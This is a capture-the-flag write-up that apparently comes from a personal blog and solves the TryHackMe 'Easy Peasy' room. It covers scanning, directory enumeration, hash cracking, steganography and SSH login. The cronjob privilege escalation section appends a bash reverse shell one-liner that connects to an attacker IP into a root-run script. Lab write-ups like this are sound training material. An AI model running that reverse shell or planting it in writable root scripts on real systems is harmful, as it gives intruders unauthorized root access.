---
layout: post
title: "Easy Peasy"
date: 2022-03-28
categories: [Tryhackme, Easy-THM]
tags: [nmap, cronjob, steganography, gobuster]
image: ../../assets/img/posts/EasyPeasy.png 

---

## Description

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

|**Room**|[Easy Peasy](https://tryhackme.com/room/easypeasyctf)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[kral4](https://tryhackme.com/p/kral4)|

---

Let's deploy the machine and we'll start with scanning open ports quickly with rustscan,

```bash
rustscan -a 10.10.140.17
```

![image](https://user-images.githubusercontent.com/67465230/160327198-c5e36fe4-1109-4f4b-bfb7-63582f24c820.png)

we got 3 open ports, Let's scan them using nmap,

```bash
nmap -sV -sC -p80,6498,65524 10.10.140.17 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/160327203-050f16e4-2a00-4cfd-8622-3c324a75f440.png)

Scan result reveals that port 80 is running nginx server, port 6498 is running ssh service and port 65524 is running apache webserver. Let's enumerate port 80.

Visit http://10.10.140.17,

![image](https://user-images.githubusercontent.com/67465230/160327217-632a3cd1-cd2c-4ddf-82b8-654972341e86.png)

we got a nginx webserver page. But there is nothing much I can find so I decided to find hidden directories using dirsearch,

```bash
dirsearch -u http://10.10.140.17 -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/160327224-655f1a99-0807-4b33-acf3-5710e8dfa3ba.png)

we found robots.txt file and a **hidden** directory.

Visit http://10.10.140.17/hidden,

![image](https://user-images.githubusercontent.com/67465230/160327231-e46d02e8-9f5e-4432-a3f1-b748a7153d7c.png)

we got a background image. Enumerating result in nothing gains. Again, finding hidden directories,

```bash
dirsearch -u http://10.10.140.17/hidden -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/160327236-e665c33b-8390-48b5-ba5c-6ae7ab6629c8.png)

we found the **whatever** directory.

Navigate to http://10.10.140.17/hidden/whatever and we got a blank page,

![image](https://user-images.githubusercontent.com/67465230/160327239-a8ce00a5-a612-4ab3-8e9e-4d6486fe98a6.png)

So checking its source code page reveals that there is a base64 encoded string.

We can decode this string using linux command,

```bash
echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d
```

![image](https://user-images.githubusercontent.com/67465230/160327242-4b867846-6643-44c9-982e-7804dc237bdc.png)

we got the flag. With this, we completed enumeration of port 80. Now, begin enumeration of port 65524.

Visit http://10.10.14017:65524,

![image](https://user-images.githubusercontent.com/67465230/160327249-560d447a-8ad8-4ef7-89ee-e6b1c5fb50af.png)

we got default apache webpage. There is not much on page itself, unless, we look at its source code.

Looking at the source code,

![image](https://user-images.githubusercontent.com/67465230/160327256-96e27ae0-efa4-4d39-aecd-52dd4a717fbc.png)

we got a string is which is encoded with some ba....? 

Visit [CyberChef](https://gchq.github.io/CyberChef) to figure out who is the encoder of this string,

![image](https://user-images.githubusercontent.com/67465230/160327269-29af0bcd-5da1-4867-9cd3-bcbae4e79761.png)

after trying all the base encoders, base62 seems worked in decoding this string and result in name of hidden directory.

Now, finding hidden directories using dirsearch,

```bash
dirsearch -u http://10.10.140.17:65524/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -i 200,301 2>/dev/null
```

![image](https://user-images.githubusercontent.com/67465230/160327272-5218eb6b-8fa5-45d9-b60c-6233ecc8588e.png)

we got robots.txt file.

Visit http://10.10.140.17:65524/robots.txt and we find a hash. So we can crack this hash on [md5hashing.net](https://md5hashing.net/hash/md5)

![image](https://user-images.githubusercontent.com/67465230/160327279-19aa1601-4b33-4438-853c-b8c9145a830f.png)
we got our flag.

There is also a flag hidden in the source code of the webpage of http://10.10.140.17:65524, we can extract it using, 

```bash
curl -s http://10.10.140.17:65524 | grep flag
```

![image](https://user-images.githubusercontent.com/67465230/160327285-a13a10a2-1cd8-4419-b7de-b22cc1e5d9e4.png)

we got our 3rd flag.

We got a hash of SHA-256 so we can crack it JTR,

```bash
john sha_256 --wordlist=easypeasy.txt --format=GOST
```

![image](https://user-images.githubusercontent.com/67465230/160327291-4cc01e33-7886-450e-af33-f547304141dc.png)

we got the password.

Navigating to http://10.10.140.17:65524/*****************/binarycodepixabay.jpg,

![image](https://user-images.githubusercontent.com/67465230/160401471-877913ec-2d39-4286-99e2-4860c4034df2.png)

we found an image which is binary numbers are shown.

We can use steghide tool to extract information from this image,

```bash
steghide extract -sf binarycodepixabay.jpg
```

![image](https://user-images.githubusercontent.com/67465230/160327304-fe92048c-e3ed-443f-988f-2254426870d7.png)

Data is extracted to secrettext.txt.

Reading the content of file show that this is the binary data,

![image](https://user-images.githubusercontent.com/67465230/160327312-4a141de9-b9b1-45a9-9a4f-b46c2632a30a.png)

We can decode this data on cyberchef,

![image](https://user-images.githubusercontent.com/67465230/160327315-4e702d76-ba76-410c-980d-84aea4664311.png)

we got our password.

Lets drop into the machine via ssh,

```bash
ssh boring@10.10.140.17 -p 6498
```

![image](https://user-images.githubusercontent.com/67465230/160327321-d334e6f6-6dc2-4db8-8e05-3e7323faf4db.png)

we got access as boring user.

We got our user flag,

![image](https://user-images.githubusercontent.com/67465230/160327327-580596dc-5484-4ac6-a65e-400e274eb907.png)

Reading flag and it says that our flag is rotated,

![image](https://user-images.githubusercontent.com/67465230/160327337-a62d42d7-9cb4-4fb1-a2bf-e2493b9ff394.png)

when decoded with ROT13,

![image](https://user-images.githubusercontent.com/67465230/160327342-db027d34-691f-4ddc-93ca-b66ece005404.png)

we got our user flag.

Now comes the privilege escalation part. Checking the content of `/etc/crontab` file,

![image](https://user-images.githubusercontent.com/67465230/160327350-d2e6e5c4-15a3-415f-9c3a-6a6a72d8df69.png)

there a bash script **.mysecretcronjob.sh** in **/var/www** directory.

Navigating to /var/www directory and listing content,

![image](https://user-images.githubusercontent.com/67465230/160327352-9cc237b4-c0aa-4660-9628-6f655cc33c7f.png)

found the script which is readable-writable-executable by user.

reading content of the script,

![image](https://user-images.githubusercontent.com/67465230/160327362-49447662-e6b1-4fd2-8c42-a1bd48f01a30.png)

we got the idea that this script will run as root.

So we can put our one-liner shell and start a netcat listener and when this script run by cronjobs, we will get system shell.

Now, start netcat listener using `nc -nvlp 4444` and put the one liner bash shell into script,

```bash
echo "bash -c 'exec bash -i &>/dev/tcp/10.9.0.182/4444 <&1'" >> .mysecretcronjob.sh
```

Reading the content of script again,

![image](https://user-images.githubusercontent.com/67465230/160328283-d5dc50b2-645b-4e44-9496-d020bb235ad6.png)

Now, when cronjobs executes this script, we got a shell,

![image](https://user-images.githubusercontent.com/67465230/160327389-25aecbfc-22d5-4a7b-bc39-6f84c745826f.png)

we got root shell.

Navigate to root directory and we got root flag which is hidden,

![image](https://user-images.githubusercontent.com/67465230/160327456-3c992650-2ba9-47a6-95a1-b12d09b9e337.png)